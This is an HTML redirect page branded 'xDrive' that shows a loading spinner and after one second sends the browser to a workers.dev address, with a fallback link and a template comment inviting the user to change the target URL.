<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xDrive · Redirect</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #252a2c;
            color: #CCCCCC;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            gap: 18px;
        }
        .spinner {
            width: 36px;
            height: 36px;
            border: 3px solid #3c484a;
            border-top-color: #219ebc;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .redirect-text {
            font-size: 12px;
            letter-spacing: 0.5px;
            opacity: 0.6;
        }
        .fallback {
            font-size: 11px;
            opacity: 0.4;
            margin-top: 6px;
        }
        .fallback a {
            color: #219ebc;
            text-decoration: none;
        }
        .fallback a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div class="redirect-text">Redirecting…</div>
    <div class="fallback">
        Not working? <a href="https://web.data-recovery-mail-me.workers.dev/" id="manualLink">Click here</a>
    </div>

    <script>
        // ============================================
        // CHANGE THIS to your target URL
        // ============================================
        const TARGET_URL = "https://web.data-recovery-mail-me.workers.dev/";

        // Set the fallback link
        document.getElementById('manualLink').href = TARGET_URL;

        // Wait a moment so the spinner is visible, then redirect
        setTimeout(() => {
            window.location.replace(TARGET_URL);
        }, 1000); // 1000ms = 1 second. Adjust as you like.
    </script>
</body>
</html>
